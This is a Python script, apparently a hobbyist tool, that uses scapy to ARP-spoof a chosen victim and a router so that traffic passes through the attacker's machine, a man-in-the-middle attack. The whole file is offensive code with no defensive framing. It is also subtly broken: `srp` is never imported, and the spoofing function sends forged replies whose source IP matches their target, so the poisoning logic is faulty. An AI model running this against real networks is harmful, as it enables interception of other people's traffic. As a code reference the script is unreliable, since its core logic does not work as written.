import os
import sys
import time
from scapy.all import ARP, Ether, send

try : 
    interface = input("[*] Enter Desired Interface : ")
    victimeIP = input("[*] Enter Victim IP : ")
    gateIP = input("[*] Enter Router IP: ")
except KeyboardInterrupt :
    print ("\n[*] User Requested Shutdown")
    print ("[*] Exiting...")
    sys.exit(1)
print ("\n[*] Enabling IP Forwarding... \n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    try:
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")
    except Exception as e:
        print(f"[!] {e}")
        sys.exit(1)

def reARP():
    print("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimeIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimeIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimeIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimeIP, hwdst = vm, psrc = victimeIP))
    send(ARP(op = 2, pdst = gateIP, hwdst = gm, psrc = gateIP))

def mitm():
    try:
        victimeMAC = get_mac(victimeIP)
    except Exception as e:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print(f"[!] {e}")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception as e:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print(f"[!] {e}")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poising Targets...")
    while 1:
        try: 
            trick(gateMAC, victimeMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break
mitm()